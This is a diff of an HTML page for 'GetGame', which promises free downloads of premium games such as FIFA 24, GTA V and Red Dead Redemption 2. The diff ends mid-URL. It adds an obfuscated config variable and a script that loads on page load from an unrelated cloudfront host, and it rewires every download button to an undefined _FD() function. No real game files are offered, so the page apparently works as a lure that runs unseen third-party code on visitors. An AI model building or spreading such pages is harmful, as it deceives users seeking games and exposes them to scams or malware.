@@ -1,8 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script type="text/javascript">
+        var jZNVg_UwI_IOwTkc={"it":4503721,"key":"c3d3a"};
+    </script>
+    <script src="https://dfmpe7igjx4jo.cloudfront.net/5aead40.js"></script> 
+    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Download premium games for free - GetGame offers the latest PC games including FIFA, GTA, Call of Duty and more">
     <title>GetGame - Download Premium Games for Free</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -16,214 +22,221 @@
             --card-bg: #ffffff;
         }
         * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: 'Poppins', sans-serif;
-    }@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
-
-body {
-    background-color: var(--light);
-    color: var(--dark);
-    line-height: 1.6;
-}
-
-header {
-    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-    color: white;
-    padding: 2rem 0;
-    text-align: center;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-    position: relative;
-}
-
-.logo {
-    font-size: 2.8rem;
-    font-weight: 700;
-    margin-bottom: 0.5rem;
-    letter-spacing: 1px;
-    background: linear-gradient(90deg, #fd79a8, #6c5ce7, #00cec9, #fd79a8);
-    background-size: 300% 300%;
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    animation: gradient 4s ease infinite;
-    display: inline-block;
-}
-
-@keyframes gradient {
-    0% { background-position: 0% 50%; }
-    50% { background-position: 100% 50%; }
-    100% { background-position: 0% 50%; }
-}
-
-.tagline {
-    font-size: 1.2rem;
-    opacity: 0.9;
-    font-weight: 300;
-}
-
-.search-container {
-    position: absolute;
-    top: 50%;
-    right: 30px;
-    transform: translateY(-50%);
-}
-
-.search-bar {
-    padding: 10px 20px;
-    border-radius: 30px;
-    border: none;
-    outline: none;
-    width: 250px;
-    transition: all 0.3s;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-}
-
-.search-bar:focus {
-    box-shadow: 0 2px 15px rgba(0,0,0,0.2);
-}
-
-.container {
-    width: 90%;
-    max-width: 1400px;
-    margin: 3rem auto;
-    padding: 0 20px;
-}
-
-.game-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-    gap: 2rem;
-}
-
-.game-card {
-    background: var(--card-bg);
-    border-radius: 12px;
-    overflow: hidden;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-    transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-}
-
-.game-card:hover {
-    transform: translateY(-8px);
-    box-shadow: 0 15px 35px rgba(0,0,0,0.12);
-}
-
-.game-img {
-    width: 100%;
-    height: 200px;
-    object-fit: cover;
-    transition: transform 0.5s ease;
-}
-
-.game-card:hover .game-img {
-    transform: scale(1.05);
-}
-
-.game-info {
-    padding: 1.5rem;
-}
-
-.game-title {
-    font-size: 1.3rem;
-    margin-bottom: 0.5rem;
-    color: var(--dark);
-    font-weight: 600;
-}
-
-.game-description { /* Added style for the description */
-    font-size: 0.9rem;
-    color: #555;
-    margin-bottom: 1rem;
-    line-height: 1.4;
-}
-
-.game-stats {
-    display: flex;
-    justify-content: space-between;
-    margin-bottom: 1.5rem;
-    font-size: 0.9rem;
-    color: #636e72;
-}
-
-.download-count i {
-    margin-right: 5px;
-    color: var(--primary);
-}
-
-.rating {
-    background: #ffeaa7;
-    color: #f39c12;
-    padding: 4px 10px;
-    border-radius: 20px;
-    font-size: 0.85rem;
-    font-weight: 600;
-}
-
-.download-btn {
-    display: block;
-    width: 100%;
-    padding: 12px;
-    background: linear-gradient(to right, var(--primary), var(--accent));
-    color: white;
-    border: none;
-    border-radius: 8px;
-    font-weight: 600;
-    cursor: pointer;
-    text-align: center;
-    transition: all 0.3s;
-    font-size: 1rem;
-}
-
-.download-btn:hover {
-    background: linear-gradient(to right, var(--primary-dark), var(--primary));
-    box-shadow: 0 5px 15px rgba(108, 92, 231, 0.3);
-}
-
-footer {
-    text-align: center;
-    padding: 2rem;
-    background: var(--dark);
-    color: white;
-    margin-top: 3rem;
-}
-
-.help-link {
-    display: inline-block;
-    margin-top: 1rem;
-    color: var(--secondary);
-    text-decoration: none;
-    transition: color 0.3s;
-}
-
-.help-link:hover {
-    color: var(--accent);
-}
-
-@media (max-width: 768px) {
-    .logo {
-        font-size: 2.2rem;
-    }
-    
-    .search-container {
-        position: static;
-        transform: none;
-        margin: 1rem auto;
-        width: 90%;
-        text-align: center;
-    }
-    
-    .search-bar {
-        width: 100%;
-    }
-    
-    .game-grid {
-        grid-template-columns: 1fr;
-    }
-}
-
-</style></head>
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
+        
+        body {
+            background-color: var(--light);
+            color: var(--dark);
+            line-height: 1.6;
+        }
+        
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            padding: 2rem 0;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            position: relative;
+        }
+        
+        .logo {
+            font-size: 2.8rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            letter-spacing: 1px;
+            background: linear-gradient(90deg, #fd79a8, #6c5ce7, #00cec9, #fd79a8);
+            background-size: 300% 300%;
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: gradient 4s ease infinite;
+            display: inline-block;
+        }
+        
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .tagline {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+        
+        .search-container {
+            position: absolute;
+            top: 50%;
+            right: 30px;
+            transform: translateY(-50%);
+        }
+        
+        .search-bar {
+            padding: 10px 20px;
+            border-radius: 30px;
+            border: none;
+            outline: none;
+            width: 250px;
+            transition: all 0.3s;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .search-bar:focus {
+            box-shadow: 0 2px 15px rgba(0,0,0,0.2);
+        }
+        
+        .container {
+            width: 90%;
+            max-width: 1400px;
+            margin: 3rem auto;
+            padding: 0 20px;
+        }
+        
+        .game-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+        
+        .game-card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+        
+        .game-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.12);
+        }
+        
+        .game-img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            transition: transform 0.5s ease;
+        }
+        
+        .game-card:hover .game-img {
+            transform: scale(1.05);
+        }
+        
+        .game-info {
+            padding: 1.5rem;
+        }
+        
+        .game-title {
+            font-size: 1.3rem;
+            margin-bottom: 0.5rem;
+            color: var(--dark);
+            font-weight: 600;
+        }
+        
+        .game-description {
+            font-size: 0.9rem;
+            color: #636e72;
+            margin-bottom: 1rem;
+            line-height: 1.4;
+            display: -webkit-box;
+            -webkit-line-clamp: 3;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .game-stats {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+            color: #636e72;
+        }
+        
+        .download-count i {
+            margin-right: 5px;
+            color: var(--primary);
+        }
+        
+        .rating {
+            background: #ffeaa7;
+            color: #f39c12;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+        
+        .download-btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(to right, var(--primary), var(--accent));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+            font-size: 1rem;
+        }
+        
+        .download-btn:hover {
+            background: linear-gradient(to right, var(--primary-dark), var(--primary));
+            box-shadow: 0 5px 15px rgba(108, 92, 231, 0.3);
+        }
+        
+        footer {
+            text-align: center;
+            padding: 2rem;
+            background: var(--dark);
+            color: white;
+            margin-top: 3rem;
+        }
+        
+        .help-link {
+            display: inline-block;
+            margin-top: 1rem;
+            color: var(--secondary);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .help-link:hover {
+            color: var(--accent);
+        }
+        
+        @media (max-width: 768px) {
+            .logo {
+                font-size: 2.2rem;
+            }
+            
+            .search-container {
+                position: static;
+                transform: none;
+                margin: 1rem auto;
+                width: 90%;
+                text-align: center;
+            }
+            
+            .search-bar {
+                width: 100%;
+            }
+            
+            .game-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
 <body>
     <header>
         <div class="logo">GetGame</div>
@@ -232,282 +245,229 @@ footer {
             <input type="text" class="search-bar" placeholder="Search games..." id="searchInput">
         </div>
     </header>
+    
     <div class="container">
         <div class="game-grid" id="gameGrid">
             <div class="game-card">
                 <img src="https://i.postimg.cc/xqS5D0Ys/fifa24.jpg" alt="FIFA 24" class="game-img">
                 <div class="game-info">
                     <h3 class="game-title">FIFA 24</h3>
-                    <p class="game-description">Download FIFA 24 for free and experience realistic football action, stunning graphics, and new game modes. Get the latest teams and players!</p>
+                    <p class="game-description">Experience the world's most realistic football simulation with enhanced gameplay and stunning graphics.</p>
                     <div class="game-stats">
                         <span class="download-count"><i class="fas fa-download"></i> 2.4M+</span>
                         <span class="rating">4.8 ★</span>
                     </div>
-                    <button class="download-btn" onclick="initDownload('fifa24')">Download Now</button>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-            </div><div class="game-card">
-            <img src="https://i.postimg.cc/phKmJb6r/gtav.jpg" alt="GTA V" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">GTA V</h3>
-                <p class="game-description">Download GTA V for free and explore the massive open world of Los Santos. Engage in thrilling missions, heists, and endless adventure.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 8.7M+</span>
-                    <span class="rating">4.9 ★</span>
-                </div>
-                <button class="download-btn" onclick="initDownload('gtav')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/dkc2YBM7/farcry.jpg" alt="Far Cry" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Far Cry</h3>
-                <p class="game-description">Download Far Cry for free and dive into a series of action-packed open-world adventures. Explore exotic locations, fight ruthless enemies, and liberate regions.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 1.9M+</span>
-                    <span class="rating">4.6 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/phKmJb6r/gtav.jpg" alt="GTA V" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">GTA V</h3>
+                    <p class="game-description">Explore the massive open world of Los Santos in this critically acclaimed action-adventure game.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 8.7M+</span>
+                        <span class="rating">4.9 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('farcry')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/9RDZ8rsJ/amongus.jpg" alt="Among Us" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Among Us</h3>
-                <p class="game-description">Download Among Us for free and join your crewmates in a thrilling game of deception and teamwork. Discover the impostor before it's too late!</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 5.2M+</span>
-                    <span class="rating">4.7 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/dkc2YBM7/farcry.jpg" alt="Far Cry" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Far Cry</h3>
+                    <p class="game-description">Survive in a dangerous open world filled with unpredictable wildlife and ruthless enemies.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 1.9M+</span>
+                        <span class="rating">4.6 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('amongus')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/FkccvwrS/minecraft.jpg" alt="Minecraft" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Minecraft</h3>
-                <p class="game-description">Download Minecraft for free and unleash your creativity in an infinite blocky world. Build anything you can imagine, explore, and survive.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 12.5M+</span>
-                    <span class="rating">4.9 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/9RDZ8rsJ/amongus.jpg" alt="Among Us" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Among Us</h3>
+                    <p class="game-description">Work together to complete tasks, but beware of impostors among your crew in this multiplayer hit.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 5.2M+</span>
+                        <span class="rating">4.7 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('minecraft')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/yWFkVmh0/fortnite.jpg" alt="Fortnite" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Fortnite</h3>
-                <p class="game-description">Download Fortnite for free and jump into the ultimate battle royale experience. Build, fight, and be the last one standing!</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 15.3M+</span>
-                    <span class="rating">4.8 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/FkccvwrS/minecraft.jpg" alt="Minecraft" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Minecraft</h3>
+                    <p class="game-description">Build, explore and survive in this block-based sandbox adventure with endless possibilities.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 12.5M+</span>
+                        <span class="rating">4.9 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('fortnite')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/tYkJ69MT/fs23.jpg" alt="Farming Simulator 23" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Farming Simulator 23</h3>
-                <p class="game-description">Download Farming Simulator 23 for free and experience the joy of modern farming. Grow crops, raise animals, and expand your agricultural empire.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 1.1M+</span>
-                    <span class="rating">4.4 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/yWFkVmh0/fortnite.jpg" alt="Fortnite" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Fortnite</h3>
+                    <p class="game-description">Battle Royale phenomenon with building mechanics, regular updates, and vibrant graphics.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 15.3M+</span>
+                        <span class="rating">4.8 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('fs23')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/06Tyvjbt/residentevil.jpg" alt="Resident Evil" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Resident Evil</h3>
-                <p class="game-description">Download Resident Evil for free and immerse yourself in the terrifying world of survival horror. Uncover conspiracies and fight grotesque creatures.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 3.7M+</span>
-                    <span class="rating">4.7 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/tYkJ69MT/fs23.jpg" alt="Farming Simulator 23" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Farming Simulator 23</h3>
+                    <p class="game-description">Manage your own farm with realistic agricultural machinery and farming operations.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 1.1M+</span>
+                        <span class="rating">4.4 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('residentevil')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/BtcHh9zW/gtaiv.jpg" alt="GTA IV" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">GTA IV</h3>
-                <p class="game-description">Download GTA IV for free and step into the shoes of Niko Bellic in Liberty City. Experience a gritty crime story with memorable characters.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 2.8M+</span>
-                    <span class="rating">4.6 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/06Tyvjbt/residentevil.jpg" alt="Resident Evil" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Resident Evil</h3>
+                    <p class="game-description">Survival horror classic with intense action, puzzle-solving and terrifying zombies.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 3.7M+</span>
+                        <span class="rating">4.7 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('gtaiv')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/Z0h6FKVF/mortalkombat.jpg" alt="Mortal Kombat" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Mortal Kombat</h3>
-                <p class="game-description">Download Mortal Kombat for free and engage in brutal, fast-paced fighting action. Master iconic characters and unleash devastating combos.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 1.5M+</span>
-                    <span class="rating">4.7 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/BtcHh9zW/gtaiv.jpg" alt="GTA IV" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">GTA IV</h3>
+                    <p class="game-description">Niko Bellic's story of redemption in Liberty City's gritty underworld environment.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 2.8M+</span>
+                        <span class="rating">4.6 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('mortalkombat')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/PpgmpMqn/gameofthrones.jpg" alt="Game of Thrones" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Game of Thrones</h3>
-                <p class="game-description">Download Game of Thrones for free and immerse yourself in the epic fantasy world of Westeros. Make choices that shape your destiny.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 1.6M+</span>
-                    <span class="rating">4.3 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/Z0h6FKVF/mortalkombat.jpg" alt="Mortal Kombat" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Mortal Kombat</h3>
+                    <p class="game-description">Brutal fighting game with iconic characters, fatalities, and cinematic story mode.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 1.5M+</span>
+                        <span class="rating">4.7 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('gameofthrones')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/94M70DXC/callofduty.jpg" alt="Call of Duty" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Call of Duty</h3>
-                <p class="game-description">Download Call of Duty for free and experience intense first-person shooter action. Join epic campaigns and thrilling multiplayer battles.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 7.2M+</span>
-                    <span class="rating">4.8 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/PpgmpMqn/gameofthrones.jpg" alt="Game of Thrones" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Game of Thrones</h3>
+                    <p class="game-description">Epic RPG based on the popular TV series with political intrigue and intense battles.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 1.6M+</span>
+                        <span class="rating">4.3 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('callofduty')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/6yJnc6cf/godofwar.jpg" alt="God of War Ragnarok" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">God of War Ragnarok</h3>
-                <p class="game-description">Download God of War Ragnarok for free and embark on an unforgettable journey with Kratos and Atreus in the Norse realms.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 3.9M+</span>
-                    <span class="rating">4.9 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/94M70DXC/callofduty.jpg" alt="Call of Duty" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Call of Duty</h3>
+                    <p class="game-description">Intense first-person shooter with cinematic campaign and competitive multiplayer modes.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 7.2M+</span>
+                        <span class="rating">4.8 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('godofwar')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/SXMzCw9v/bully.jpg" alt="Bully" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Bully</h3>
-                <p class="game-description">Download Bully for free and relive your school days with a twist. Navigate the social hierarchy and pull off mischievous pranks.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 1.3M+</span>
-                    <span class="rating">4.5 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/6yJnc6cf/godofwar.jpg" alt="God of War Ragnarok" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">God of War Ragnarok</h3>
+                    <p class="game-description">Kratos and Atreus journey through Norse realms in this epic action-adventure sequel.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 3.9M+</span>
+                        <span class="rating">4.9 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('bully')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/G93R613Y/monopolygo.jpg" alt="Monopoly Go" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Monopoly Go</h3>
-                <p class="game-description">Download Monopoly Go for free and play the classic board game with friends and family. Build your empire and bankrupt your opponents!</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 2.1M+</span>
-                    <span class="rating">4.4 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/SXMzCw9v/bully.jpg" alt="Bully" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Bully</h3>
+                    <p class="game-description">Open-world school adventure where you navigate the social hierarchy of Bullworth Academy.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 1.3M+</span>
+                        <span class="rating">4.5 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('monopolygo')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/75Rj6fz8/reddead2.jpg" alt="Red Dead Redemption 2" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">Red Dead Redemption 2</h3>
-                <p class="game-description">Download Red Dead Redemption 2 for free and explore the vast American frontier as Arthur Morgan. A gripping story of outlaws and survival.</p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 6.8M+</span>
-                    <span class="rating">4.9 ★</span>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/G93R613Y/monopolygo.jpg" alt="Monopoly Go" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Monopoly Go</h3>
+                    <p class="game-description">Mobile version of the classic board game with quick matches and digital enhancements.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 2.1M+</span>
+                        <span class="rating">4.4 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
                 </div>
-                <button class="download-btn" onclick="initDownload('reddead2')">Download Now</button>
             </div>
-        </div>
-        
-        <div class="game-card">
-            <img src="https://i.postimg.cc/62GNfCdh/gtanetflix.jpg" alt="GTA Netflix" class="game-img">
-            <div class="game-info">
-                <h3 class="game-title">GTA Netflix</h3>
-                <p class="game-description">Download GTA Netflix for free and enjoy the classic Grand Theft Auto experience, now available through your Netflix subscription. </p>
-                <div class="game-stats">
-                    <span class="download-count"><i class="fas fa-download"></i> 3.5M+</span>
-                    <span class="rating">4.6 ★</span>
-                </div>
-                <button class="download-btn" onclick="initDownload('gtanetflix')">Download Now</button>
-            </div>
-        </div>
-    </div>
-</div>
 
-<footer>
-    <p>© 2023 GetGame. All Rights Reserved</p>
-    <a href="https://t.me/ossama76775" class="help-link"><i class="fab fa-telegram"></i> Help - Contact Support</a>
-</footer>
-
-<script>
-    // Search functionality
-    document.getElementById('searchInput').addEventListener('input', function() {
-        const searchTerm = this.value.toLowerCase();
-        const gameCards = document.querySelectorAll('.game-card');
-        
-        gameCards.forEach(card => {
-            const title = card.querySelector('.game-title').textContent.toLowerCase();
-            const description = card.querySelector('.game-description').textContent.toLowerCase(); 
-            if (title.includes(searchTerm) || description.includes(searchTerm)) {
-                card.style.display = 'block';
-            } else {
-                card.style.display = 'none';
-            }
-        });
-    });
-
-    // Game scripts data
-    const gameScripts = {
-        "fifa24": {
-            varName: "IZjRQ_lDh_aCDBvc",
-            it: 4502251,
-            key: "035c7",
-            src: "https://dlk457skl57zp.cloudfront.net/0a26493.js"
-        },
-        "gtav": {
-            varName: "IZjRQ_lDh_aCDBvc",
-            it: 4502251,
-            key: "035c7",
-            src: "https://dlk457skl57zp.cloudfront.net/0a26493.js"
-        },
-        "farcry": {
-            varName: "IZjRQ_lDh_aCDBvc",
-            it: 4502251,
-            key: "035c7",
-            src: "https://dlk457skl57zp.cloudfront.net/0a26493.js"
-        },
-        "amongus": {
-            varName: "EIaEH_EfG_bYRRSc",
-            it: 4502267,
-            key: "c4a4c",
-            src: "https://dlk457skl57zp.cloudfront.net/8f65690.js"
-        },
-        "minecraft": {
-            varName: "yHnQP_vmu_PlPCrc",
-            it: 4502237,
-            key: "60faa",
-            src: "https://dfmpe7igjx4jo.cloudfront.net/61c9a3b.js"
-        },
-        "fortnite": {
-  
+            <div class="game-card">
+                <img src="https://i.postimg.cc/Bj1XyB6k/baseball9.jpg" alt="Baseball 9" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Baseball 9</h3>
+                    <p class="game-description">Enjoy fast-paced, realistic baseball action with intuitive controls and engaging gameplay.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 4.5M+</span>
+                        <span class="rating">4.7 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
+                </div>
+            </div>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/75Rj6fz8/reddead2.jpg" alt="Red Dead Redemption 2" class="game-img">
+                <div class="game-info">
+                    <h3 class="game-title">Red Dead Redemption 2</h3>
+                    <p class="game-description">Epic Western adventure with stunning open world and deep narrative storytelling.</p>
+                    <div class="game-stats">
+                        <span class="download-count"><i class="fas fa-download"></i> 6.8M+</span>
+                        <span class="rating">4.9 ★</span>
+                    </div>
+                    <button class="download-btn" onclick="_FD()">Download Now</button>
+                </div>
+            </div>
+            
+            <div class="game-card">
+                <img src="https://i.postimg.cc/62GNfCdh/
